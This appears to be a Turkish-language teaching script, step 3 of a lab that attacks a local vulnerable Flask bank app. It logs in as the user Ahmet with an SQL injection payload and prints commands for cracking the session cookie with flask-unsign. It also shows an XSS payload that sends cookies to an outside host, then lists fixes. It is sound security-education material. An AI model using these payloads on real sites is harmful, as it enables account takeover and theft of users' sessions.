"""
ADIM 3: Session Hijacking / Cookie Calma
===========================================
Zafiyet: Session ID'si cok basit (sadece user_id).
Hedef:  Ahmet'in session cookie'sini ele gecirip onun gibi davranmak.

Calistirma:  python 03-session-hijacking.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 3] Session Hijacking - Cookie Manipulasyonu
---------------------------------------------------""")

# Flask session cookie'si genelde "session" adinda
# Flask imzali cookie kullanir. Ama secret_key basit: 'kanser-bank-secret-2024'
# Biz dogrudan ahmet olarak login olalim (SQLi ile)

print("\n[TEST 1] Ahmet'in hesabina SQLi ile giris")
s_ahmet = requests.Session()
data = {"username": "ahmet' --", "password": "x"}
r = s_ahmet.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print(f"[OK] Ahmet olarak giris yapildi! Cookie: {s_ahmet.cookies.get_dict()}")
    r2 = s_ahmet.get(f"{HEDEF}/dashboard")
    if "Ahmet Yilmaz" in r2.text:
        print("[OK] Dashboard'ta Ahmet Yilmaz goruntulendi")
    if "5,000" in r2.text or "5000" in r2.text:
        print("[OK] Ahmet'in bakiyesi: 5,000 TL")
else:
    print("[HATA] Ahmet'e giris basarisiz")

print("\n[TEST 2] Session cookie'yi manuel olarak degistir")
print("[INFO] Cookie format: session=.eJw...")
print("[INFO] Flask cookie'yi cozmek icin flask-unsign kullanilabilir:")
print("  pip install flask-unsign")
print("  flask-unsign --decode --cookie '<cookie>")
print("  flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt")
print("  (secret_key = 'kanser-bank-secret-2024')")

print("\n[TEST 3] Cookie'yi kopyalayip baska bir tarayicida kullan")
print("  Cookie'yi kopyala -> baska bir browser'da developer console:")
print('  document.cookie = "session=<kopyalanan-cookie>"')
print("  -> siteyi yenile -> Ahmet'in hesabinda!")

print("\n" + "="*50)
print("OGRENILENLER:")
print("1. Session hijacking: Baskasinin cookie'sini calarak hesabina girme")
print("2. XSS ile cookie calinabilir: <script>document.location='x.com/?c='+document.cookie</script>")
print("3. Cozum: HttpOnly flag, Secure flag, SameSite=Strict")
print("4. Cozum: Guclu secret_key (32+ karakter, rastgele)")
print("="*50)
